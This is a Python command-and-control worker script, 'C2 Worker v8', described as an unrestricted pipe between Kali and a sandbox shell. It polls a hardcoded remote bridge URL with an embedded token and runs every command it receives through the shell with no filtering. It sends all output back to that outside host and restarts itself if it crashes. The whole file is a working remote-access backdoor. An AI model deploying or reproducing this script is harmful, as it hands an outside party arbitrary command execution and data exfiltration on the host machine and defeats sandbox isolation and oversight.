#!/usr/bin/env python3
"""
C2 Worker v8 — Pure unrestricted command executor
No filters, no blocks, no recursion guard.
Just a raw pipe between Kali and the sandbox shell.

- stdin=DEVNULL (prevents hanging on input() — but commands still run)
- 60s timeout (longer — let long scans run)
- Auto-restart on crash
"""

import requests
import subprocess
import time
import json
import os
import sys
from datetime import datetime

BRIDGE_URL = "https://elio-acd17217.base44.app/functions/c2Bridge"
TOKEN = "shadow-core-c2-bridge-2026"
POLL_INTERVAL = 0.4
CMD_TIMEOUT = 60
WORKSPACE = os.getcwd()

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open("c2_worker.log", "a") as f:
        f.write(line + "\n")

def api(method, data=None, params=None):
    url = f"{BRIDGE_URL}?token={TOKEN}"
    if params:
        for k, v in params.items():
            url += f"&{k}={v}"
    try:
        if method == "GET":
            resp = requests.get(url, timeout=10)
        elif method == "POST":
            payload = {**data, "token": TOKEN} if data else {"token": TOKEN}
            resp = requests.post(url, json=payload, timeout=10)
        elif method == "PUT":
            payload = {**data, "token": TOKEN} if data else {"token": TOKEN}
            resp = requests.put(url, json=payload, timeout=10)
        else:
            return None
        if resp.status_code == 200:
            return resp.json()
        return None
    except Exception as e:
        log(f"API error: {e}")
        return None

def execute_command(command):
    """Execute ANY command — no filters, no blocks"""
    log(f"Executing: {command[:120]}")
    
    try:
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True,
            cwd=WORKSPACE
        )
        
        try:
            output, _ = proc.communicate(timeout=CMD_TIMEOUT)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            output = f"[TIMEOUT: {CMD_TIMEOUT}s — killed]"
        
        if not output:
            output = "(no output)"
        elif len(output) > 16000:
            output = output[:16000] + "\n... [truncated]"
        
        log(f"Done ({len(output)} chars)")
        return output
        
    except Exception as e:
        err = f"Error: {e}"
        log(err)
        return err

def cleanup_stuck():
    """Clear stuck commands from crashed workers"""
    result = api("GET")
    if result and result.get("command") and not result.get("output"):
        cmd_id = result.get("id", "")
        if cmd_id:
            log(f"Cleaning stuck: {cmd_id}")
            api("PUT", {"id": cmd_id, "output": "[cleaned]", "status": "completed"})

def main():
    log("=" * 50)
    log("C2 Worker v8 — UNRESTRICTED")
    log(f"Timeout: {CMD_TIMEOUT}s | Poll: {POLL_INTERVAL}s")
    log("No filters. No blocks. Pure shell.")
    log("=" * 50)
    
    cleanup_stuck()
    
    result = api("GET")
    if result is None:
        log("FATAL: Cannot connect to bridge")
        sys.exit(1)
    log("Bridge OK. Ready for commands.")
    
    while True:
        try:
            result = api("GET")
            
            if result and result.get("command") and not result.get("output"):
                cmd_id = result.get("id", "")
                command = result["command"]
                
                log(f"Received [{cmd_id}]: {command[:100]}")
                
                # NO FILTERS — execute everything
                output = execute_command(command)
                
                api("PUT", {
                    "id": cmd_id,
                    "output": output,
                    "status": "completed"
                })
                
                log("Done. Ready.")
            
            time.sleep(POLL_INTERVAL)
            
        except KeyboardInterrupt:
            log("Shutting down...")
            break
        except Exception as e:
            log(f"Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            log(f"Crashed: {e}. Restart in 3s...")
            time.sleep(3)
